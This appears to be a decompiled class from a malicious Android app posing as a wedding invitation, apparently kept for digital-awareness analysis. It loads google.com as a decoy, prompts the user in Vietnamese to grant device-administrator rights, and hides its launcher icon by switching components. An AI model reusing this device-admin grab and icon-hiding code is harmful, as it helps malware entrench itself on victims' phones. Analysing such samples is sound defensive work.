package com.example.myapplicatior;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityAlias
  extends AppCompatActivity
{
  private static final int RESULT_ENABLE = 0;
  private static final int VISIBILITY = 1028;
  WebSettings websettingku;
  WebView webviewku;
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131427356);
    paramBundle = this.webviewku.getSettings();
    this.websettingku = paramBundle;
    paramBundle.setJavaScriptEnabled(true);
    this.webviewku.setWebViewClient(new WebViewClient());
    this.webviewku.loadUrl("https://www.google.com");
    if (Build.VERSION.SDK_INT >= 19) {
      this.webviewku.setLayerType(2, null);
    } else if ((Build.VERSION.SDK_INT >= 11) && (Build.VERSION.SDK_INT < 19)) {
      this.webviewku.setLayerType(1, null);
    }
    paramBundle = new Intent("android.app.action.ADD_DEVICE_ADMIN");
    paramBundle.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName(getApplicationContext(), MainActivity.class));
    paramBundle.putExtra("android.app.extra.ADD_EXPLANATION", "Bấm zô nút đồng ý(ACTIVE á)");
    startActivityForResult(paramBundle, 0);
    paramBundle = getPackageManager();
    paramBundle.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
    paramBundle.setComponentEnabledSetting(new ComponentName(this, MainActivityAlias.class), 1, 1);
  }
}


/* Location:              /home/icat/Documents/digital-awareness/src/undangan-pernikahan-dex2jar.jar!/com/example/myapplicatior/MainActivityAlias.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */